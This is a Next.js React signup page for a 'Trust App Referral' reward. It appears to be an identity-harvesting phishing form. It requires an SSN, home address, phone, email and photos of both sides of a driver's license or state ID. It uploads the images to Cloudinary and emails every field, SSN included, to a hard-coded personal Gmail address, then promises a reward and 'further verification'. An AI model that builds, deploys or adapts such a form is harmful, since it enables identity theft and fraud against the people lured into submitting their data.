"use client";

import { useState } from "react";
import Image from "next/image";
import { BsArrowLeft } from "react-icons/bs";
import emailjs from "@emailjs/browser";
import trust_logo from "@public/images/trust-logo.png";
import Link from "next/link";
import TextField from "@components/common/TextField";
import FileInput from "@components/common/FileInput";
import { getSignature } from "@app/_actions";
import { toast } from "react-toastify";

const Signup = () => {
  const [referralData, setReferralData] = useState({
    firstName: "",
    lastName: "",
    ssn: "",
    phone: "",
    email: "",
    address: "",
    idFront: "",
    idBack: "",
    referralId: "",
  });

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState({
    idFront: "",
    idBack: "",
  });

  const handleTextChange = (e) => {
    setReferralData((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const handleFileChange = (e) => {
    console.log(e.target.files[0]);
    const file = e.target.files[0];
    if (file.size > 5242880) {
      setError((prev) => ({
        ...prev,
        [e.target.name]: "Your image is too large",
      }));
      return;
    } else {
      setError((prev) => ({ ...prev, [e.target.name]: "" }));
    }

    setReferralData((prev) => ({
      ...prev,
      [e.target.name]: e.target.files[0],
    }));
  };

  async function action() {
    const {
      ssn,
      phone,
      email,
      firstName,
      lastName,
      address,
      referralId,
      idFront,
      idBack,
    } = referralData;

    if (
      !ssn ||
      !phone ||
      !email ||
      !firstName ||
      !lastName ||
      !address ||
      !idFront ||
      !idBack
    ) {
      toast.error("Some fields are empty.", {
        theme: "dark",
        autoClose: 2000,
      });

      return;
    }

    // get a signature using server action
    const { timestamp, signature } = await getSignature();

    const files = [referralData.idFront, referralData.idBack];

    try {
      setLoading(true);
      const promises = files.map(async (file) => {
        // upload to cloudinary using the signature
        const formData = new FormData();

        formData.append("file", file);
        formData.append("api_key", process.env.NEXT_PUBLIC_CLOUDINARY_API_KEY);
        formData.append("signature", signature);
        formData.append("timestamp", timestamp);
        formData.append("folder", "trust");

        const endpoint = process.env.NEXT_PUBLIC_CLOUDINARY_UPLOAD_URL;
        const data = await fetch(endpoint, {
          method: "POST",
          body: formData,
        }).then((res) => res.json());

        return data;
      });

      const result = await Promise.all(promises);
      console.log(result);
      const emailMessage = `
        First Name: ${firstName},
        Last Name: ${lastName},
        SSN: ${ssn},
        Phone: ${phone},
        Email: ${email},
        Address: ${address},
        Front of ID: ${result[0]?.secure_url},
        Back of ID: ${result[1]?.secure_url},
        Referral ID: ${referralId}
      `;

      await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
        {
          from_name: `${firstName} ${lastName}`,
          to_name: "Trust App",
          from_email: email,
          to_email: "phemmyteelectronics@gmail.com",
          message: emailMessage,
        },
        process.env.NEXT_PUBLIC_EMAILJS_KEY
      );
      console.log("Submitted successfully.");
      setReferralData({
        firstName: "",
        lastName: "",
        ssn: "",
        phone: "",
        email: "",
        address: "",
        idFront: "",
        idBack: "",
        referralId: "",
      });
      toast.success(
        `Congratulations! 
        You’ve successfully submitted your details for the referral reward (you’ll be contacted if we need further verification and offer). Thanks`,
        {
          theme: "dark",
          autoClose: false,
          position: "top-center",
        }
      );
    } catch (error) {
      console.log(error);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="max-w-[800px] mx-auto py-[50px] md:py-[80px]">
      <Link
        href="/"
        className="w-max flex gap-2 items-center text-[20px] font-bold"
      >
        <BsArrowLeft /> <span>Go back</span>
      </Link>
      <div className="relative w-[80px] h-[80px] mx-auto mb-6">
        <Image
          src={trust_logo}
          alt="Trust logo"
          fill
          className="inline-block rounded-full"
        />
      </div>
      <h1 className="text-[26px] font-bold leading-[33px] text-center mb-6">
        Trust App Referral
      </h1>
      <form action={action} className="md:text-[18px]">
        <TextField
          id="first-name"
          type="text"
          title="1. First Name"
          value={referralData.firstName}
          name="firstName"
          handleTextFieldChange={handleTextChange}
          required={true}
        />
        <TextField
          id="last-name"
          type="text"
          title="2. Last Name"
          value={referralData.lastName}
          name="lastName"
          handleTextFieldChange={handleTextChange}
          required={true}
        />
        <TextField
          id="ssn"
          type="number"
          title="3. SSN"
          value={referralData.ssn}
          name="ssn"
          handleTextFieldChange={handleTextChange}
          required={true}
        />
        <TextField
          id="phone"
          type="tel"
          title="4. Phone Number"
          value={referralData.phone}
          name="phone"
          handleTextFieldChange={handleTextChange}
          required={true}
        />
        <TextField
          id="email"
          type="email"
          title="5. Email Address"
          value={referralData.email}
          name="email"
          handleTextFieldChange={handleTextChange}
          required={true}
        />
        <TextField
          id="address"
          type="text"
          title="6. Address"
          value={referralData.address}
          name="address"
          handleTextFieldChange={handleTextChange}
          required={true}
        />
        <FileInput
          id="id-front"
          type="file"
          title="7. Front view of Driver's License/State ID"
          name="idFront"
          handleFileChange={handleFileChange}
          required={true}
          error={error.idFront}
          max={5242880}
        />
        <FileInput
          id="id-back"
          type="file"
          title="8. Back view of Driver`s License/State ID"
          name="idBack"
          handleFileChange={handleFileChange}
          required={true}
          error={error.idBack}
          max={5242880}
        />

        <TextField
          id="referral-id"
          type="tel"
          title="9. Referral ID"
          value={referralData.referralId}
          name="referralId"
          handleTextFieldChange={handleTextChange}
          required={false}
        />

        <div className="text-center mt-6">
          <button
            type="submit"
            disabled={loading}
            className="w-[95px] h-[38px] bg-color-primary text-white rounded mx-auto flex items-center justify-center hover:bg-blue-500"
          >
            {loading ? "Loading..." : "Submit"}
          </button>
        </div>
      </form>
    </div>
  );
};

export default Signup;
